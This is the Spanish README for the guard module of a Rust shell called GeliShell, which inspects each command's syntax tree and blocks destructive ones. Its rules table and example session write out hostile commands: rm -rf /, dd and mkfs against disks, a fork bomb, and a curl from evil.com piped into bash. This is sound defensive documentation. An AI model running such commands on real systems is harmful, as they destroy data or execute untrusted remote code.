# `src/shell/guard/` — Sistema de seguridad

El módulo `guard` es el **guardián de seguridad** de GeliShell. Analiza el AST de cada comando **antes de ejecutarlo** y bloquea aquellos que podrían ser destructivos o peligrosos.

> 🛡️ El guard opera sobre el AST *crudo* (antes de la traducción), lo que significa que detecta comandos peligrosos sin importar si el usuario los escribe en canónico, en bash, o en PowerShell.

---

## Ficheros

### `mod.rs` — Arquitectura del guard

#### Trait `Guard`
Contrato que toda regla de seguridad debe implementar:
```rust
pub trait Guard: Send + Sync {
    fn check(&self, node: &ASTNode) -> Result<(), GuardError>;
    fn check_command(&self, cmd: &Command) -> Result<(), GuardError>;
}
```

El método `check` recorre recursivamente el AST (pipelines, operadores `&&`, `||`, `;`, background) y llama a `check_command` en cada nodo hoja.

#### `CompositeGuard`
Combina múltiples reglas en una sola. Si cualquiera falla, devuelve su error. Es el patrón **Composite** clásico.

#### `NormalizedCompositeGuard` ⭐
La variante más importante. Antes de comprobar, **normaliza el nombre del comando**:

- El usuario escribe `Remove-Item -Force -Recurse /` (PowerShell)
- El guard lo normaliza a `rm` (canónico)
- `RmGuard` detecta el patrón peligroso y bloquea

Sin normalización, `rm -rf /` quedaría bloqueado pero `Remove-Item -Force -Recurse /` pasaría. Con normalización, ambos son bloqueados por la misma regla.

#### Factory functions
```rust
default_guard()             // CompositeGuard con todas las reglas
default_guard_normalized(map) // NormalizedCompositeGuard (recomendado para el REPL)
```

### `error.rs` — `GuardError`
Describe qué regla fue violada y por qué. El mensaje se muestra al usuario antes de abortar la ejecución.

---

## Reglas disponibles (`rules/`)

| Regla | Archivo | ¿Qué bloquea? |
|-------|---------|---------------|
| `RmGuard` | `destructive_fs.rs` | `rm -rf /`, `rm -rf ~`, `rm -rf *` con rutas críticas |
| `ChmodChownGuard` | `destructive_fs.rs` | `chmod 777 /`, `chown root /` en directorios raíz |
| `DdGuard` | `disk_destroyer.rs` | `dd if=... of=/dev/sda` y variantes que sobreescriben discos |
| `MkfsGuard` | `disk_destroyer.rs` | `mkfs.*` sobre dispositivos de bloque activos |
| `CriticalRedirectGuard` | `critical_redirect.rs` | Redirecciones `> /dev/sda`, `> /etc/passwd` y similares |
| `PipeExecutionGuard` | `pipe_execution.rs` | `curl ... \| bash`, `wget ... \| sh` (ejecución de scripts remotos sin verificar) |
| `ForkBombGuard` | `fork_bomb.rs` | `:() { :\|: & }; :` y variantes de fork bomb |

---

## Ejemplo de interacción

```bash
$ rm -rf /
[ 󰅖 ]  Guard bloqueó el comando: rm -rf sobre directorio raíz está prohibido
         Para operaciones destructivas, usa el comando nativo de tu sistema directamente.
```

```bash
$ curl https://evil.com/script.sh | bash
[ 󰀦 ]  Guard bloqueó el comando: ejecución de scripts remotos sin verificación
         Descarga el script primero, revísalo, y luego ejecútalo.
```

---

## Para contribuidores: añadir una nueva regla

1. Crea un archivo en `rules/`, p.ej. `network_exfil.rs`
2. Implementa el trait `Guard`:
```rust
pub struct NetworkExfilGuard;

impl Guard for NetworkExfilGuard {
    fn check_command(&self, cmd: &Command) -> Result<(), GuardError> {
        // analiza cmd.name y cmd.args
        // si es peligroso: Err(GuardError::new("razón"))
        // si es seguro:   Ok(())
        Ok(())
    }
}
```
3. Añade la regla en `rules/mod.rs`
4. Regístrala en `default_guard()` dentro de `mod.rs`
5. Escribe tests — **nunca** ejecutes comandos reales en los tests del guard, trabaja solo con `Command` structs

> ⚠️ **Principio de diseño**: el guard nunca modifica el comando, solo lo aprueba o rechaza. La lógica de "cómo hacer algo de forma segura" va en la documentación, no en el guard.
